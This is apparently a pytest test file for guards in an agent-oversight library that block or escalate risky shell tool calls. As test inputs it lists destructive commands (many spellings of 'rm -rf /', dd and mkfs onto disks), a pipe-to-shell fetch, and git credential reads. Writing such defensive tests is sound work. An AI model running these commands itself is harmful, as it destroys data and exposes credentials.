"""Parsed-command detectors: command_intent_guard, and the parsed path that
destructive_command_guard and git_credential_guard gained (R14)."""
import pytest

from interlock import Blocked, NotApproved, PolicyEngine, SensorEvent, Verdict, install
from interlock.approval import set_approver
from interlock.detectors.command_intent_guard import POLICY_ID, command_intent_guard
from interlock.detectors.destructive_command_guard import destructive_command_guard
from interlock.detectors.git_credential_guard import git_credential_guard
from interlock.interceptors.mcp import enforce_tool_call


def _event(**args):
    return SensorEvent(action="run_shell", args=args)


# --- destructive_command_guard: the parsed path -----------------------------

PROBE = [
    "rm -rf /", "rm -fr /", "rm -r -f /", "rm --recursive --force /", "sudo rm -rf /",
    "bash -c 'rm -rf /'", "echo hi; rm -rf  /", "/bin/rm -Rf /", "rm -rf /*", "rm -rf ~",
    "find / -delete", "python3 -c 'import os; os.system(\"rm -rf /\")'",
]


@pytest.mark.parametrize("cmd", PROBE)
def test_destructive_guard_blocks_every_probe_spelling(cmd):
    decision = destructive_command_guard()(_event(cmd=cmd))
    assert decision is not None and decision.verdict is Verdict.BLOCK
    assert decision.reason == "destructive_command: cmd"
    assert decision.attributed_to == "cmd"


@pytest.mark.parametrize("cmd", [
    "chmod -R 777 /usr", "dd if=/dev/zero of=/dev/disk2", "echo x > /dev/sda",
    "mkfs.ext4 /dev/sdb1", "find / -exec rm -rf {} +",
])
def test_destructive_guard_blocks_other_critical_intents(cmd):
    assert destructive_command_guard()(_event(cmd=cmd)) is not None


@pytest.mark.parametrize("cmd", ["rm -rf ./build", "rm -rf node_modules", "rm -rf /tmp/x",
                                 "git status", "make clean"])
def test_destructive_guard_still_allows_routine_commands(cmd):
    assert destructive_command_guard()(_event(cmd=cmd)) is None


def test_parse_false_keeps_the_raw_pattern_only():
    guard = destructive_command_guard(parse=False)
    assert guard(_event(cmd="rm -fr /")) is None
    assert guard(_event(cmd="rm -rf /")) is not None


# --- git_credential_guard: the parsed path ----------------------------------


@pytest.mark.parametrize("cmd", [
    "git -C repo config --get remote.origin.password", "git config --list",
    "git credential fill",
])
def test_git_credential_guard_parsed_spellings(cmd):
    decision = git_credential_guard()(_event(cmd=cmd))
    assert decision is not None and decision.verdict is Verdict.BLOCK


def test_git_credential_guard_parse_false():
    assert git_credential_guard(parse=False)(_event(cmd="git credential fill")) is None


# --- command_intent_guard ----------------------------------------------------


def test_blocks_selected_intent_regardless_of_spelling():
    guard = command_intent_guard(block=["git.push.force:default"])
    for cmd in ["git push --force origin main", "git -C repo push origin +main",
                "cd x && git push -f origin master"]:
        decision = guard(_event(command=cmd))
        assert decision is not None and decision.verdict is Verdict.BLOCK, cmd
        assert decision.policy_id == POLICY_ID
        assert decision.attributed_to == "command"
        assert "git.push.force:default" in decision.reason
    assert guard(_event(command="git push -f origin feature")) is None


def test_reason_never_contains_the_command_text():
    decision = command_intent_guard(block=["pkg.publish"])(
        _event(command="npm publish --otp=123456"))
    assert decision is not None and "123456" not in decision.reason


def test_escalate_selectors():
    guard = command_intent_guard(block=["net.fetch_exec"], escalate=["pkg.publish"])
    assert guard(_event(command="npm publish")).verdict is Verdict.ESCALATE
    assert guard(_event(command="curl x | sh")).verdict is Verdict.BLOCK


def test_block_wins_over_escalate_in_the_same_command():
    guard = command_intent_guard(block=["net.fetch_exec"], escalate=["pkg.publish"])
    decision = guard(_event(command="npm publish && curl x | sh"))
    assert decision.verdict is Verdict.BLOCK


def test_keys_and_actions_scope_the_rule():
    guard = command_intent_guard(block=["pkg.publish"], keys=["command"], actions=["run_shell"])
    assert guard(_event(note="npm publish")) is None
    assert guard(SensorEvent(action="other", args={"command": "npm publish"})) is None
    assert guard(_event(command="npm publish")) is not None


def test_needs_a_selector():
    with pytest.raises(ValueError):
        command_intent_guard()


def test_non_dict_and_non_str_args():
    guard = command_intent_guard(block=["pkg.publish"])
    assert guard(SensorEvent(action="x", args=None)) is None  # type: ignore[arg-type]
    assert guard(_event(command=["npm", "publish"])) is None


def test_escalation_end_to_end_without_and_with_an_approver():
    install(rules=[command_intent_guard(escalate=["pkg.publish"])])
    try:
        with pytest.raises(NotApproved):
            enforce_tool_call("run_shell", {"command": "npm publish"})
        set_approver(lambda request: True)
        assert enforce_tool_call("run_shell", {"command": "npm publish"}) == {
            "command": "npm publish"}
    finally:
        set_approver(None)
        install(engine=PolicyEngine())


def test_engine_level_block_from_a_parsed_intent():
    engine = PolicyEngine([command_intent_guard(block=["fs.delete.recursive:critical"])])
    assert engine.evaluate(_event(command="rm -fr ~")).verdict is Verdict.BLOCK
    with pytest.raises(Blocked):
        enforce_tool_call("run_shell", {"command": "rm -fr ~"}, engine=engine)
